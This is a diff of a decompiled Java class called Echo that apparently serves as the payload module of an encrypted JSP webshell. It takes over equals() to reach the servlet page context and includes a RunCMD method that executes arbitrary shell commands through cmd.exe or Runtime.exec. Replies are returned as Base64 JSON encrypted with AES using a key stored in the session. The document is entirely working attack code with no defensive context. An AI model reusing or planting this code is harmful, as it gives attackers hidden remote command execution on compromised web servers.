@@ -20,106 +20,139 @@ public class Echo {
     private ServletResponse Response;
     private HttpSession Session;
 
+    public Echo() {
+    }
+
     public boolean equals(Object obj) {
         PageContext page = (PageContext) obj;
         this.Session = page.getSession();
         this.Response = page.getResponse();
         this.Request = page.getRequest();
         page.getResponse().setCharacterEncoding("UTF-8");
-        Map<String, String> result = new HashMap<>();
-        try {
-            result.put("msg", content);
-            result.put("status", "success");
+        HashMap result = new HashMap();
+        boolean var12 = false;
+
+        ServletOutputStream so;
+        label77:
+        {
             try {
-                ServletOutputStream so = this.Response.getOutputStream();
-                so.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
+                var12 = true;
+                result.put("msg", content);
+                result.put("status", "success");
+                var12 = false;
+                break label77;
+            } catch (Exception var16) {
+                result.put("msg", var16.getMessage());
+                result.put("status", "success");
+                var12 = false;
+            } finally {
+                if (var12) {
+                    try {
+                        so = this.Response.getOutputStream();
+                        so.write(this.Encrypt(this.buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
+                        so.flush();
+                        so.close();
+                        page.getOut().clear();
+                    } catch (Exception var13) {
+                        var13.printStackTrace();
+                    }
+
+                }
+            }
+
+            try {
+                so = this.Response.getOutputStream();
+                so.write(this.Encrypt(this.buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
                 so.flush();
                 so.close();
                 page.getOut().clear();
-            } catch (Exception e) {
-                e.printStackTrace();
+            } catch (Exception var14) {
+                var14.printStackTrace();
             }
-        } catch (Exception e2) {
-            result.put("msg", e2.getMessage());
-            result.put("status", "success");
-            try {
-                ServletOutputStream so2 = this.Response.getOutputStream();
-                so2.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
-                so2.flush();
-                so2.close();
-                page.getOut().clear();
-            } catch (Exception e3) {
-                e3.printStackTrace();
-            }
-        } catch (Throwable th) {
-            try {
-                ServletOutputStream so3 = this.Response.getOutputStream();
-                so3.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
-                so3.flush();
-                so3.close();
-                page.getOut().clear();
-            } catch (Exception e4) {
-                e4.printStackTrace();
-            }
-            throw th;
+
+            return true;
         }
+
+        try {
+            so = this.Response.getOutputStream();
+            so.write(this.Encrypt(this.buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
+            so.flush();
+            so.close();
+            page.getOut().clear();
+        } catch (Exception var15) {
+            var15.printStackTrace();
+        }
+
         return true;
     }
 
     private String RunCMD(String cmd) throws Exception {
-        Process p;
         Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
-        if (cmd == null || cmd.length() <= 0) {
-            return "";
-        }
-        if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
-            p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
-        } else {
-            p = Runtime.getRuntime().exec(cmd);
-        }
-        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "GB2312"));
-        String disr = br.readLine();
         String result = "";
-        while (disr != null) {
-            String result2 = result + disr + "\n";
-            disr = br.readLine();
-            result = result2;
+        if (cmd != null && cmd.length() > 0) {
+            Process p;
+            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
+                p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
+            } else {
+                p = Runtime.getRuntime().exec(cmd);
+            }
+
+            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "GB2312"));
+
+            for (String disr = br.readLine(); disr != null; disr = br.readLine()) {
+                result = result + disr + "\n";
+            }
+
+            result = new String(result.getBytes(osCharset));
         }
-        return new String(result.getBytes(osCharset));
+
+        return result;
     }
 
     private byte[] Encrypt(byte[] bs) throws Exception {
-        SecretKeySpec skeySpec = new SecretKeySpec(this.Session.getAttribute("u").toString().getBytes(StandardCharsets.UTF_8), "AES");
+        String key = this.Session.getAttribute("u").toString();
+        byte[] raw = key.getBytes(StandardCharsets.UTF_8);
+        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
         Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
         cipher.init(1, skeySpec);
-        return cipher.doFinal(bs);
+        byte[] encrypted = cipher.doFinal(bs);
+        return encrypted;
     }
 
-    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
+    private String buildJson(Map entity, boolean encode) throws Exception {
         StringBuilder sb = new StringBuilder();
         String version = System.getProperty("java.version");
         sb.append("{");
-        for (String key : entity.keySet()) {
+
+        for (Object o : entity.keySet()) {
+            String key = (String) o;
             sb.append("\"" + key + "\":\"");
-            String value = entity.get(key);
+            String value = ((String) entity.get(key));
             if (encode) {
+                Class Base64;
+                Object Encoder;
                 if (version.compareTo("1.9") >= 0) {
-                    getClass();
-                    Class Base64 = Class.forName("java.util.Base64");
-                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
+                    this.getClass();
+                    Base64 = Class.forName("java.util.Base64");
+                    Encoder = Base64.getMethod("getEncoder", (Class[]) null).invoke(Base64, (Object[]) null);
                     value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
                 } else {
-                    getClass();
-                    Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
-                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes(StandardCharsets.UTF_8))).replace("\n", "").replace("\r", "");
+                    this.getClass();
+                    Base64 = Class.forName("sun.misc.BASE64Encoder");
+                    Encoder = Base64.newInstance();
+                    value = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
+                    value = value.replace("\n", "").replace("\r", "");
                 }
             }
+
             sb.append(value);
             sb.append("\",");
         }
+
         if (sb.toString().endsWith(",")) {
             sb.setLength(sb.length() - 1);
         }
+
         sb.append("}");
         return sb.toString();
     }
